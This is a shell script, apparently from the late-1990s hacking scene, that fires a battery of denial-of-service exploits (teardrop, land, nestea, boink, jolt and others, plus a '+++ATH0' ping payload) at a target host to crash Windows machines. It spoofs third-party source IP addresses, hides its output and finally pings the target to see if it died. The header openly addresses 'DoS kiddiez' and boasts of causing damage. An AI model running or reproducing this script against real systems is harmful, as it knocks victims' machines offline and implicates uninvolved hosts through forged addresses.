#!/bin/sh
#--------------------[kpk]----------------------------------
#simple utility that will just fuck any windows machine
#using multiple DoS attacks to be sure that the damage
#is done. Pretty lame actually, but if you're one of those
#DoS kiddiez, well, have fun. Greets go out to:
#|gyr0|, 0|3g, c0d3z, ]{ewl, #bitchx@unet, #ehforce@unet
#Punk182, NForcer. P.A.T.C.H  [people all for tools causing hell]
#------------- [pr0t] beware of us [pr0t] --------------------
#-misteri0@unet[pr0tocol]


echo -- kod.c --
./bin/kod $1 -t 10 1>/dev/null 2>/dev/null
./bin/kod $1 -p 139 -t 10 1>/dev/null 2>/dev/null
echo -- pimp.c --
./bin/kpk/pimp $1 1>/dev/null 2>/dev/null
echo -- kox.c --
./bin/kox $1 1>/dev/null 2>/dev/null
echo -- ath0+++ bug --
ping -c 20 -p 2b2b2b415448300d $1 1>/dev/null 2>/dev/null
echo -- land.c --
./bin/land $1 54 1>/dev/null 2>/dev/null
./bin/land $1 79 1>/dev/null 2>/dev/null
./bin/land $1 139 1>/dev/null 2>/dev/null
./bin/land $1 53 1>/dev/null 2>/dev/null
echo -- jolt --
./bin/jolt $1 209.198.193.10 4 1>/dev/null 2>/dev/null
echo -- boink.c --
./bin/boink 204.71.200.75 $1 20 25 10 1>/dev/null 2>/dev/null
./bin/boink 204.71.200.75 $1 50 58 10 1>/dev/null 2>/dev/null
./bin/boink 204.71.200.75 $1 78 80 10 1>/dev/null 2>/dev/null
./bin/boink 204.71.200.75 $1 110 114 10 1>/dev/null 2>/dev/null
./bin/boink 204.71.200.75 $1 134 140 10 1>/dev/null 2>/dev/null
echo -- teardrop.c --
./bin/teardrop 204.71.200.75 $1 -s 10 -t 113 -n 10 1>/dev/null 2>/dev/null
./bin/teardrop 204.71.200.75 $1 -s 19 -t 19 -n 10 1>/dev/null 2>/dev/null
./bin/teardrop 204.71.200.75 $1 -n 10 1>/dev/null 2>/dev/null
echo "-- misfrag.c -- <-- my pride and joy"
./bin/misfrag 204.71.200.75 0 $1 0 400 1>/dev/null 2>/dev/null
./bin/misfrag 204.71.200.75 18 $1 19 300 1>/dev/null 2>/dev/null
echo "-- fawx.c -- <-- IGMP blaster"
./bin/fawx $1 $1 400 1>/dev/null 2>/dev/null
echo -- ssping.c --
./bin/ssping $1 $1 200 1>/dev/null 2>/dev/null
echo -- nestea.c --
./bin/nestea $1 $1 -s 19 -t 139 -n 100 1>/dev/null 2>/dev/null
./bin/nestea $1 $1 -s 10 -t 10 -n 100 1>/dev/null 2>/dev/null
./bin/nestea $1 $1 -s 10 -t 10 -n 100 1>/dev/null 2>/dev/null 
echo -- bloop.c -- ??
./bin/bloop $1 $1 100 1>/dev/null 2>/dev/null
echo -- DONE! -- 
echo -- pinging [ $1 ] to check it still alive--
ping -c 2 $1
